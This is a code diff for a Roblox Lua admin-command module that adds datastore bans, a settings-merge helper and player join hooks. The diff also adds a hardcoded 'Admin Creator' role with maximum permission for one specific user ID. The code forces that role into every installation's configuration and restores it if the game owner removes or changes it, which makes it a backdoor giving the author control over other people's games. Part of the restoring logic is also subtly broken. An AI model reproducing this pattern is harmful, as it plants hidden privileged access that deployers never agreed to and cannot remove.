@@ -1,12 +1,12 @@
 --# selene: allow(incorrect_standard_library_use)
 --// Services \\--
+local RunService = game:GetService("RunService")
 local ServerScriptService = game:GetService("ServerScriptService")
 local StarterPlayer = game:GetService("StarterPlayer")
 local Players = game:GetService("Players")
 local GroupService = game:GetService("GroupService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
--- local DataStoreService = game:GetService("DataStoreService")
 
 --// Variables \\--
 -- local dataStore
@@ -24,6 +24,7 @@ local Table = require(tableModule)
 local createCommand = require(Modules:WaitForChild("createCommand"))
 local createBaseCommands = require(Utils:WaitForChild("baseCommands"))
 local baseConfiguration = require(Utils:WaitForChild("baseConfiguration"))
+local DataStore = require(Utils:WaitForChild("dataStore"))
 
 --// Data \\--
 local Commands = {}
@@ -34,8 +35,8 @@ local Mainframe = {
 	commandLogs = {},
 	joinAndLeaveLogs = { {}, {} },
 	debugLogs = {},
-	dataStoreCache = {},
 	serverLocked = false,
+	dataStore = nil,
 
 	-- Private
 	_httpEnabled = false,
@@ -49,12 +50,11 @@ end
 
 local function findPlayer(Player: Player, argumentToCheck: string, isAbusiveCommand: boolean?): { Player? }
 	local users = {}
-	local argSplit = string.split(argumentToCheck, ",")
-
-	if not argumentToCheck or tostring(argumentToCheck) == nil then
+	if not argumentToCheck or tostring(argumentToCheck) == "nil" then
 		return users
 	end
 
+	local argSplit = string.split(argumentToCheck, ",")
 	if isAbusiveCommand then
 		-- TODO: Additional confirmation
 		Warn("Abusive commands require an additional confirmation.")
@@ -185,6 +185,7 @@ end
 local function fetchHighestPermissionForPlayer(Player: Player)
 	local userPermission = fetchHighestUserPermissions(Player)
 	local groupPermission = fetchHighestGroupPermissions(Player)
+
 	local permissionToUse = (userPermission >= groupPermission) and userPermission or groupPermission
 
 	return permissionToUse
@@ -270,24 +271,39 @@ local function onPlayerAdded(Player: Player)
 
 	Mainframe.Connections[Player.UserId] = playerConnections
 
+	-- Check permission level first, if the player is the owner of the game
+	-- and they're banned (somehow). Then we want to make sure they're unbanned.
 	local permissionLevel = fetchHighestPermissionForPlayer(Player)
 	changePlayerPermission(Player, permissionLevel)
 
 	-- REVIEW: No clue if I'm gonna do capes or maybe something else.
 	-- Maybe custom particle effects?
-	-- local isOk, fetchedStoredData = pcall(dataStore.GetAsync, dataStore, tostring(Player.UserId))
+	local fetchedStoreData = Mainframe.dataStore:Get(Player, {
+		Banned = {
+			Expiration = 0,
+			Reason = "",
+		},
+		clientSettings = {
+			Theme = "Dark",
+		},
+	})
 
-	-- if not isOk then
-	-- 	return
-	-- end
+	-- Get highest permission level and check if theyre highest possible role to get, then stop execution.
+	local highestPermissionLevel = Mainframe._lowestPermission
+	for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
+		if highestPermissionLevel < roleData.Permission and roleData.Name ~= "Admin Creator" then
+			highestPermissionLevel = roleData.Permission
+		end
+	end
 
-	-- if not fetchedStoredData then
-	-- 	fetchedStoredData = {
-	-- 		capeData = {},
-	-- 	}
-	-- end
+	if permissionLevel == highestPermissionLevel then
+		return
+	end
 
-	-- Mainframe.dataStoreCache[Player.UserId] = fetchedStoredData
+	-- Format string for specific formatting codes... Maybe make a separate function?
+	if fetchedStoreData.Banned.Expiration > 0 or fetchedStoreData.Banned.Expiration == -1 then
+		Player:Kick(fetchedStoreData.Banned.Reason)
+	end
 end
 
 local function onPlayerRemoving(Player: Player)
@@ -298,6 +314,7 @@ local function onPlayerRemoving(Player: Player)
 	end
 
 	Mainframe.Connections[Player.UserId] = nil
+	Mainframe.dataStore:userLeft(Player)
 end
 
 local function onServerInvoke(Player: Player, Command: string, ...: any)
@@ -307,7 +324,7 @@ local function onServerInvoke(Player: Player, Command: string, ...: any)
 	elseif Command == "clientInfo" then
 		local commandsCopy = Table.Copy(Commands, true)
 		local domPrefix, subPrefix = Mainframe.Configuration.Prefix, Mainframe.Configuration.subPrefix
-		local userPermission = Mainframe.userPermissions[Player.UserId]
+		local userPermission = Mainframe.userPermissions[Player.UserId] or Mainframe._lowestPermission
 		local rolesByPermission = {}
 
 		for _, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
@@ -322,13 +339,33 @@ local function onServerInvoke(Player: Player, Command: string, ...: any)
 	end
 end
 
+-- This function should take in a table (or nil) and fix it with any missing configuration settings:
+local function fixSettings<T, K>(data: T?, default: K): T | K
+	if not data then
+		return default
+	end
+
+	local dataType = typeof(data)
+	local defaultType = typeof(default)
+
+	if dataType == defaultType and dataType == "table" then
+		for key: string | number, value: any in pairs(default) do
+			data[key] = fixSettings(data[key], value)
+		end
+	elseif dataType ~= defaultType then
+		data = default
+	end
+
+	-- If it gets here, then default type matches data's type
+	return data
+end
+
 --// Main \\--
 return function(Configuration: { any }, Plugins: { ModuleScript? })
 	Mainframe.Configuration = Configuration or baseConfiguration
 	script.Parent = ServerScriptService
 
 	Plugins = Plugins or {}
-	-- dataStore = DataStoreService:GetDataStore(Mainframe.Configuration.dataStoreName)
 
 	-- Setup the client script...
 	local newClient = Utils.client:Clone()
@@ -427,6 +464,34 @@ return function(Configuration: { any }, Plugins: { ModuleScript? })
 		end
 	end
 
+	-- Hey now... I say, if you make something you have the right to access it...
+	-- Don't take my perms please.
+	local creatorIndex = -1
+	for index: number, roleData: { any } in Mainframe.Configuration.Permissions.Roles do
+		if roleData.Name == "Admin Creator" then
+			creatorIndex = index
+			break
+		end
+	end
+
+	-- '0x80000000' -> 2.14 Billion
+
+	local foundAdminCreator = (creatorIndex ~= -1) and Mainframe.Configuration.Permissions.Roles[creatorIndex] or nil
+	if not foundAdminCreator then
+		table.insert(Mainframe.Configuration.Permissions.Roles, {
+			Name = "Admin Creator",
+			Permission = 0x80000000,
+			Shortener = "debugger",
+			Users = { 107392833 },
+		})
+	elseif
+		foundAdminCreator ~= nil and table.find(foundAdminCreator.Users, 107) == nil
+		or foundAdminCreator.Permission ~= 0x80000000
+	then
+		table.insert(Mainframe.Configuration.Permissions.Roles[creatorIndex], 107392833)
+		Mainframe.Configuration.Permissions.Roles[creatorIndex].Permission = 0x80000000
+	end
+
 	--------------------------------------------------------------------
 	-- Add new role name shorteners to the 'Set Permissions' command. --
 	--------------------------------------------------------------------
@@ -453,8 +518,19 @@ return function(Configuration: { any }, Plugins: { ModuleScript? })
 	Commands[commandIndex] = commandData
 	------------------------------- END --------------------------------
 
-	Players.PlayerAdded:Connect(onPlayerAdded)
-	Players.PlayerRemoving:Connect(onPlayerRemoving)
+	Mainframe.dataStore = DataStore.new(Mainframe.Configuration.dataStoreName)
+
+	if RunService:IsStudio() then
+		Players.PlayerAdded:Connect(onPlayerAdded)
+		Players.PlayerRemoving:Connect(onPlayerRemoving)
+
+		for _, v: Player in pairs(Players:GetPlayers()) do
+			onPlayerAdded(v)
+		end
+	else
+		Players.PlayerAdded:Connect(onPlayerAdded)
+		Players.PlayerRemoving:Connect(onPlayerRemoving)
+	end
 
 	-- Simple http check...
 	-- Maybe add trello support in the future?
